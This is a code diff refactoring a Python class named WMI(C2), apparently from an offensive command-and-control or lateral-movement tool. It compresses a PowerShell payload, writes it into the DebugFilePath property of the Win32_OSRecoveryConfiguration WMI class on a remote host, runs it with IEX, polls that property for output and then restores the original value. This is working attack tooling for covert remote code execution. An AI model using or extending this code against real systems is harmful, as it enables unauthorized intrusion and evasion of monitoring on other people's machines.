@@ -13,8 +13,8 @@ class WMI(C2):
     and outputs in WMI class(es) properties
     '''
 
-    def __init__(self, args, connection, payload, exec_methods):
-        C2.__init__(**locals())
+    def __init__(self, proto, payload, exec_methods, force_ps32, ret_output):
+        C2.__init__(self, proto, payload, exec_methods, force_ps32, ret_output)
 
         self.command_with_output = "$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; " \
                                    "$out = IEX (Invoke-Decompress -Data $a.DebugFilePath) | Out-String; " \
@@ -37,11 +37,11 @@ class WMI(C2):
         iWbemLevel1Login.RemRelease()
 
     def run(self):
-        compressed_payload = ps_deflate_and_encode(self.payload)
+        compressed_payload = ps_deflate_and_encode(self.create_ps_payload(self.payload))
 
         records = self.read()
         self.write(records, compressed_payload)
-        self.execute_command(self.command_with_output if self.retOutput else self.command_without_output)
+        self.execute_command(self.command_with_output if self.ret_output else self.command_without_output)
         output = self.get_output(compressed_payload)
         self.write(records)
 
@@ -98,12 +98,12 @@ class WMI(C2):
         logging.debug('Writing payload to {}.{} - OK'.format(wmi_class, attribute))
 
     def get_output(self, compressed_payload):
-        if self.retOutput is False:
+        if not self.ret_output:
             return
 
         while True:
             records = self.read("Select DebugFilePath from Win32_OSRecoveryConfiguration")
             if records[0]['DebugFilePath']['value'][:20] != compressed_payload[:20]:
-                self.outputBuffer = ps_decode_and_inflate(records[0]['DebugFilePath']['value'])
-                return
+                return ps_decode_and_inflate(records[0]['DebugFilePath']['value'])
+            logging.debug("Output not yet written to WMI property")
             sleep(4)
